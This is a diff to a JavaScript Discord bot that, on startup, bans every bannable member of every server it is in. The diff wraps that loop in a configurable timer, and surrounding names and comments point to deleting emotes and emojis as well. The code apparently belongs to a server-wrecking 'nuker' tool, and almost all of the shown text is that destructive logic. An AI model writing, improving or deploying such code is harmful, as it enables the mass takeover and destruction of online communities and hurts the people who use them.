@@ -16,7 +16,8 @@ const {
     deleteEmotes,
     commandModeToggle,
     cmd,
-    prefix
+    prefix,
+    banIntervalTime
 } = require('./config.json');
 
 
@@ -100,16 +101,19 @@ client.on("ready", () => {
     if (banMembers) {
         client.guilds.forEach(guild => {
             guild.members.forEach(m => {
+                //set interval based on set time in configuration
+                setInterval(function () {
 
-                //check if user is bannable
-                if (!m.bannable) return; //console.log(chalk.bgGrey + ('INFO:') + ` ${m.user.username} could not be banned`);
-                m.ban()
-                console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`)
+                    //check if user is bannable
+                    if (!m.bannable) return; //console.log(chalk.bgGrey + ('INFO:') + ` ${m.user.username} could not be banned`);
+                    m.ban()
+                    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`)
 
-
+                }, banIntervalTime)
             });
         });
     }
+
 
 
     //delete emojis
